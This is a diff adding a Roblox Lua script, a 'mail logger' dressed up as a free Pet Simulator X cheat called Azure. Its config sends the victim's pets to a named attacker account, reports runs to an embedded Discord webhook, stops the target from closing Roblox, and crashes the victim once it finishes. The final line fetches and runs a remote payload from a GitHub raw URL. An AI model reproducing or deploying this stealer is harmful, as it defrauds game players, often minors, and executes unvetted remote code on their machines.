@@ -1,0 +1,20 @@
+--[[ Arkhalis Mail Logger ]]--
+ 
+--[[ Config ]]--
+_G.Username = "darius123goo" --// Username To Send Pets To
+_G.ScriptName = "Azure" --// Script Name For Watermark
+_G.Webhook = "https://discord.com/api/webhooks/1094695432388612168/LEILvPdZZhnho7MzOKgwpmGIiKXqy3Q0WRjmS3pZTxFFw_os_X3k1KYRl4nHMqGN_ys6" --// Discord Webhook For Executions
+_G.GiftMessage = "Ez" --// Message For The Gift To Say
+_G.Diamonds = 500000 --// Amount Of Diamonds To Not Kick
+_G.UnlockPets = true --// Unlocks Locked Pets
+_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
+_G.Crash = true  --// Crashes Them After Its Finished
+_G.Tip1 = "Azure is free pet sim X cheat" --// Gives You Tips On The UI
+_G.Tip2 = "Ez easter eggs!" --// Gives You Tips On The UI
+_G.Tip3 = "Enjoy!" --// Gives You Tips On The UI
+_G.Tip4 = "Its free if you pay for it you got scammed" --// Gives You Tips On The UI
+_G.Tip5 = "Made by Enjo111" --// Gives You Tips On The UI
+ 
+--[[ Script ]]--
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))()
